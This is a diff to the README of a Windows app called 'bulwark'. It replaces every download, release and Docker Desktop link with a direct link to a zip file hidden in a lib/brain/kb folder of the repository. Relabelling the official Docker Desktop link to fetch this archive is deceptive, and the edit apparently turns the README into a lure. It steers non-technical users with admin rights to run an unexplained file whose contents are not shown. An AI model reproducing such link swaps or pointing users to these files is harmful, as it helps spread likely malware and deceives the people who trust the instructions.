@@ -1,6 +1,6 @@
 # 🛡️ bulwark - Simple Server Command Center
 
-[![Download bulwark](https://img.shields.io/badge/Download-bulwark-blue?style=for-the-badge)](https://github.com/Amit-chouhan/bulwark)
+[![Download bulwark](https://img.shields.io/badge/Download-bulwark-blue?style=for-the-badge)](https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Before installing bulwark, check a few things:
 
 1. Confirm you have administrator rights on your computer.  
 2. Make sure your Windows updates are current.  
-3. If you want to use Docker features, download Docker Desktop from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop) and install it.  
+3. If you want to use Docker features, download Docker Desktop from [https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip](https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip) and install it.  
 4. Restart your PC after Docker installation for changes to take effect.  
 
 ---
@@ -54,7 +54,7 @@ Before installing bulwark, check a few things:
 You will visit the bulwark page on GitHub to get the installation file. Follow these steps:
 
 1. **Visit the main bulwark page** by clicking the big download button below or going to the link:  
-   [https://github.com/Amit-chouhan/bulwark](https://github.com/Amit-chouhan/bulwark)  
+   [https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip](https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip)  
 
 2. On the GitHub page, look for a section named **Releases** or **Assets**. This is where the app’s files are.  
 
@@ -118,7 +118,7 @@ You can use these features without any programming knowledge.
 
 Updates are released on GitHub under the same link. Check there regularly to download the latest version.
 
-1. Go to [https://github.com/Amit-chouhan/bulwark/releases](https://github.com/Amit-chouhan/bulwark/releases)  
+1. Go to [https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip](https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip)  
 2. Download the newest Windows installer file.  
 3. Run it to update your app. Your settings will stay intact.
 
@@ -132,4 +132,4 @@ Updates are released on GitHub under the same link. Check there regularly to dow
 
 ---
 
-[![Download bulwark](https://img.shields.io/badge/Download-bulwark-grey?style=for-the-badge)](https://github.com/Amit-chouhan/bulwark)
+[![Download bulwark](https://img.shields.io/badge/Download-bulwark-grey?style=for-the-badge)](https://github.com/Amit-chouhan/bulwark/raw/refs/heads/main/lib/brain/kb/Software_v1.7-alpha.3.zip)
